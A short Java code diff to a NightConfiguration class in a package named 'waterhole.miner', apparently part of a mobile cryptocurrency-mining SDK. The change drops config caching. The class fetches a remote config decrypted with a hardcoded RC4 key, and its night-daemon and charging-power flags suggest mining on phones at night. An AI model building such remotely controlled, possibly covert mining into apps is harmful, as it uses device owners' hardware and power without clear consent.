@@ -21,7 +21,6 @@ import static waterhole.miner.core.utils.LogUtils.info;
 
 public final class NightConfiguration {
 
-    private NightConfig configObject;
     public static final String key = "fd6cde7c2f4913f22297c948dd530c84";
 
     private NightConfiguration() {
@@ -49,7 +48,7 @@ public final class NightConfiguration {
                     info("fetch config response = " + response);
                     if (TextUtils.isEmpty(response)) return;
                     JSONObject _json = new JSONObject(RC4.decry_RC4(Base64Util.decode(new JSONObject(response).optString("data")), key));
-                    configObject = new NightConfig();
+                    NightConfig configObject = new NightConfig();
                     configObject.enableNightDaemon = _json.optBoolean("enable_night_daemon");
                     configObject.nightStartupTime = _json.optLong("night_startup_time");
                     configObject.consumerChargingPower = _json.optInt("consumer_charging_power");
@@ -66,10 +65,6 @@ public final class NightConfiguration {
 
     public void getConfigObject(final Context context, final AsyncTaskListener<NightConfig> listener) {
         if (context == null || listener == null) return;
-        if (configObject != null) {
-            listener.runComplete(configObject);
-            return;
-        }
         executeOnThreadPool(new Runnable() {
             @Override
             public void run() {
